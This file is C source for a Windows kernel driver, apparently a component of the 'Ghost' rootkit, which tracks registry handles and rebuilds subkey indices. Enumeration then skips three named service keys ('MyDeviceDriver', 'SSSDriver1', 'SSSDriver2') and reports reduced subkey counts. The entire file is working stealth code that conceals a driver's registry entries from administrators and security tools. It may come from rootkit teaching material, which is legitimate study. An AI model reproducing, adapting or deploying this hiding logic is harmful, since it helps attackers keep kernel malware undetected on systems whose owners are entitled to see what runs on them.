// keyManager
// Copyright Ric Vieler, 2006
// Routines used by registry key hooks

#include "ntddk.h"
#include "Ghost.h"
#include "registryManager.h"

// keys to hide
#define SERVICE_KEY1_LENGTH	14
#define SERVICE_KEY2_LENGTH	10
#define SERVICE_KEY3_LENGTH	10
WCHAR g_key1[] = L"MyDeviceDriver";
WCHAR g_key2[] = L"SSSDriver1";
WCHAR g_key3[] = L"SSSDriver2";

// master key list
KEY_HANDLE g_keyList;

// synchronization objects
KSPIN_LOCK	g_registrySpinLock;
KIRQL		g_pCurrentIRQL;


// Call this once from DriverEntry()
void InitializeKeyTracking()
{
	memset(&g_keyList, 0, sizeof(KEY_HANDLE));
}

// Call this once from OnUnload()
void FreeKeyTrackingData()
{
	REG_KEY_DATA* pKeyData;
	SUBKEY_DATA* pSubkeyData;
	SUBKEY_DATA* pNextSubkey;
	KEY_HANDLE* pNextKeyHandle;
	KEY_HANDLE* pKeyHandle = g_keyList.next;

	while( pKeyHandle )
	{
		pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
		if( pKeyData )
		{
			pSubkeyData = pKeyData->subkeyData;
			while( pSubkeyData )
			{
				pNextSubkey = pSubkeyData->next;
				ExFreePool( pSubkeyData );
				pSubkeyData = pNextSubkey;
			}
			ExFreePool( pKeyData );
		}
		pNextKeyHandle = pKeyHandle->next;
		ExFreePool( pKeyHandle );
		pKeyHandle = pNextKeyHandle;
	}
}

// Look for a specific key
KEY_HANDLE* FindKeyHandle( HANDLE hKey )
{
	KEY_HANDLE* pKeyHandle = &g_keyList;

	KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );
	
	while( pKeyHandle->next != NULL )
	{
		pKeyHandle = pKeyHandle->next;
		if(pKeyHandle->handle == hKey)
		{
			KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
			return pKeyHandle;
		}
	}

	KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
	return NULL;
}

// Add a key to the key list
void AddNewKeyHandle( KEY_HANDLE* newKey )
{
	KEY_HANDLE* pKeyHandle = &g_keyList;

	KeAcquireSpinLock(&g_registrySpinLock, &g_pCurrentIRQL);

	while( pKeyHandle->next != NULL )
		pKeyHandle = pKeyHandle->next;

	pKeyHandle->next = newKey;
	newKey->next = NULL;
	newKey->previous = pKeyHandle;

	KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
}

// Find the index that skips hidden keys
ULONG GetNewIndex( HANDLE hKey, ULONG index )
{
	KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );
	
	KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );

	if( pKeyHandle )
	{
		if(	pKeyHandle->keyData )
		{
			REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
			if( pKeyData )
			{
				SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
				
				while( pSubkeyData )
				{
					pSubkeyData = pSubkeyData->next;
					if( pSubkeyData )
					{
						if( index == pSubkeyData->subkeyIndex )
						{
							ULONG foundIndex = pSubkeyData->newIndex; 
							KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
							return foundIndex;
						}
					}
				}
			}
		}
	}

	KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );

	return -1;
}

// Find the key count that skips hidden keys
ULONG GetSubkeyCount( HANDLE hKey )
{
	KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );
	
	KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );

	if( pKeyHandle )
	{
		REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
		if(	pKeyData )
		{
			ULONG subKeys = pKeyData->subkeys;
			KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
			return( subKeys );
		}
	}

	KeReleaseSpinLock(&g_registrySpinLock, g_pCurrentIRQL);
	return -1;
}

void FreeKeyHandle( HANDLE hKey )
{
	REG_KEY_DATA* pKeyData;
	SUBKEY_DATA* pSubkeyData;
	SUBKEY_DATA* pNextSubkey;
	KEY_HANDLE* pKeyHandle = FindKeyHandle( hKey );

	KeAcquireSpinLock( &g_registrySpinLock, &g_pCurrentIRQL );

	if( pKeyHandle )
	{
		KEY_HANDLE* pPreviousKey = pKeyHandle->previous;
		KEY_HANDLE* pNextKey = pKeyHandle->next;

		pPreviousKey->next = pNextKey;
		
		if( pNextKey )
			pNextKey->previous = pPreviousKey;
	}

	KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );

	if( pKeyHandle )
	{
		pKeyData = NULL;

		pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
		if( pKeyData )
		{
			pSubkeyData = pKeyData->subkeyData;
			while( pSubkeyData )
			{
				pNextSubkey = pSubkeyData->next;
				ExFreePool( pSubkeyData );
				pSubkeyData = pNextSubkey;
			}
			ExFreePool( pKeyData );
		}
		ExFreePool( pKeyHandle );
	}
}

KEY_HANDLE* AllocateKeyHandle( HANDLE hKey )
{
	KEY_HANDLE* pKeyHandle = NULL;

	pKeyHandle = (KEY_HANDLE*)ExAllocatePool( PagedPool, sizeof(KEY_HANDLE) );
	if( pKeyHandle )
	{
		memset( pKeyHandle, 0, sizeof(KEY_HANDLE) );
		pKeyHandle->handle = hKey;
		
		pKeyHandle->keyData = ExAllocatePool( PagedPool, sizeof(REG_KEY_DATA) );
		
		if(pKeyHandle->keyData)
		{
			REG_KEY_DATA* pKeyData;
			memset( pKeyHandle->keyData, 0, sizeof(REG_KEY_DATA) );
			pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
			pKeyData->subkeys = 0;
			pKeyData->subkeyData = (SUBKEY_DATA*)ExAllocatePool( PagedPool, sizeof(SUBKEY_DATA) );
			
			if( pKeyData->subkeyData )
			{
				memset( pKeyData->subkeyData, 0, sizeof(SUBKEY_DATA) );
			}
		}
	}
	return pKeyHandle;
}

void AddIndices( KEY_HANDLE* pKeyHandle, ULONG index, ULONG newIndex )
{
	REG_KEY_DATA* pKeyData = NULL;
	
	if(( pKeyHandle ) && ( pKeyHandle->keyData ))
	{
		pKeyData =((REG_KEY_DATA*)( pKeyHandle->keyData ));

		if( pKeyData )
		{
			SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
			while( pSubkeyData )
			{
				if( pSubkeyData->next == NULL )
				{
					pSubkeyData->next = (SUBKEY_DATA*)ExAllocatePool(
						PagedPool, sizeof(SUBKEY_DATA));
					
					if( pSubkeyData->next )
					{
						memset( pSubkeyData->next, 0, sizeof(SUBKEY_DATA) );
						pSubkeyData->next->subkeyIndex = index;
						pSubkeyData->next->newIndex = newIndex;						
						break;
					}
				}
				pSubkeyData = pSubkeyData->next;
			}
		}
	}
}

// increment next newIndex
SUBKEY_DATA* AdjustNextNewIndex( SUBKEY_DATA* pSubkeyData, int offset )
{
	SUBKEY_DATA* targetKey = NULL;;

	while( pSubkeyData->next != NULL )
	{
		if( pSubkeyData->next->subkeyIndex + offset != pSubkeyData->next->newIndex )
		{
			// next key is a hidden key
			// so increment newIndex
			if( targetKey == NULL )
			{
				targetKey = pSubkeyData;
			}
			else
			{
				// adjust all new indices
				// until next non hidden key
				SUBKEY_DATA* tempKey = targetKey;
				while( tempKey != pSubkeyData)
				{
					tempKey->next->newIndex++;
					tempKey = tempKey->next;
				}
			}
			targetKey->newIndex++;
			offset++;
		}
		else
		{
			// keep incrementing newIndex
			// until next key is not hidden
			if( targetKey )
				break;
		}
		pSubkeyData = pSubkeyData->next;
	}
	// list is now good up to target key
	return targetKey;
}

// reindex key pair list when more than one
// sub key is hidden under a single key
void AdjustIndices( KEY_HANDLE* pKeyHandle, int hiddenKeys )
{
	KeAcquireSpinLock(&g_registrySpinLock, &g_pCurrentIRQL);

	if(	pKeyHandle->keyData )
	{
		REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
		if( pKeyData )
		{
			int offset = 0;
			SUBKEY_DATA* pSubkeyData = pKeyData->subkeyData;
			
			// loop through indices looking for hidden keys
			while( pSubkeyData->next != NULL )
			{
				if( pSubkeyData->subkeyIndex + offset != pSubkeyData->newIndex )
				{
					hiddenKeys--;
					// adjust next hidden key
					offset++;
					pSubkeyData = AdjustNextNewIndex( pSubkeyData, offset );
					offset = pSubkeyData->newIndex - pSubkeyData->subkeyIndex;
				}
				pSubkeyData = pSubkeyData->next;
				// no need to exceed show count
				if( !hiddenKeys )
					break;
			}
		}
	}
	KeReleaseSpinLock( &g_registrySpinLock, g_pCurrentIRQL );
}

// create a key list with index data that skips hidden keys
int CreateHiddenKeyIndices( HANDLE hKey )
{
	int status;
	int index = 0;
	int offset = 0;
	int visibleSubkeys = 0;
    PVOID pInfoStruct; 
    ULONG infoStructSize;
    ULONG resultLength; 
	KEY_HANDLE* pKeyHandle = 0;

	pKeyHandle = FindKeyHandle( hKey );

	// remove old sub key data if it exists
	if( pKeyHandle )
		FreeKeyHandle( hKey );
	pKeyHandle = AllocateKeyHandle( hKey );
	
	// size must be larger than any of the info structures
	infoStructSize = 256;
	pInfoStruct = ExAllocatePool( PagedPool, infoStructSize ); 

    if ( pInfoStruct == NULL )
        return -1; 

	// enumerate subkeys
	for(;;)
	{
		status = ZwEnumerateKey(
				hKey, 
                index,  
                KeyBasicInformation, 
                pInfoStruct, 
                infoStructSize, 
                &resultLength);

		if( status == STATUS_SUCCESS ) 
		{
			// Add one compare for each hidden key defined
			if( !wcsncmp(
						((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
						g_key1,
						SERVICE_KEY1_LENGTH) ||
				!wcsncmp(
						((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
						g_key2,
						SERVICE_KEY2_LENGTH) ||
				!wcsncmp(
						((KEY_BASIC_INFORMATION*)pInfoStruct)->Name,
						g_key3,
						SERVICE_KEY3_LENGTH) )
			{
				offset++;
			}
			else
			{
				visibleSubkeys++;
			}
			AddIndices( pKeyHandle, index, (index + offset));
			index++;
		}
		else
		{
			// STATUS_NO_MORE_ENTRIES
			break;
		}
	}
	if( offset > 1 )
	{
		// required if more than one sub key was found
		AdjustIndices( pKeyHandle, offset );
	}

	ExFreePool( (PVOID)pInfoStruct );
	
	/* update data about this handle */
	if( pKeyHandle )
	{
		REG_KEY_DATA* pKeyData = ((REG_KEY_DATA*)( pKeyHandle->keyData ));
		if( pKeyData )
		{
			pKeyData->subkeys = visibleSubkeys;
		}
		AddNewKeyHandle( pKeyHandle );
	}	
	return 0;
}

